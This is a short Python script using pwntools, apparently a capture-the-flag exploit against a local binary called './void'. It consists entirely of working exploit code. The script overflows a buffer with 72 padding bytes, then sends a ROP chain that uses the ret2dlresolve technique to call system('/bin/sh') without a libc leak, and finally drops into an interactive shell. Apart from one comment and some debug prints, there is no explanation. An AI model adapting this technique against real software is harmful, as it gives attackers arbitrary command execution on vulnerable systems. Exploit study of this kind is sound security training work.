from pwn import *

# For when you don't have a way to leak a libc address,
# ret2dlresolve works

context.binary = './void'
rop = ROP(context.binary)

dlresolve = Ret2dlresolvePayload(context.binary, symbol='system', args=['/bin/sh\0'])

print("Data address:")
print(hexdump(dlresolve.data_addr))
print()

print("ret:")
print(hexdump(rop.ret[0]))
print()

rop.read(0, dlresolve.data_addr)
rop.raw(rop.ret[0])
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

p = context.binary.process()

print(hexdump(raw_rop))

print()
print(hexdump(dlresolve.payload))

p.sendline(b'A'*72+raw_rop)
p.sendline(dlresolve.payload)
p.interactive()
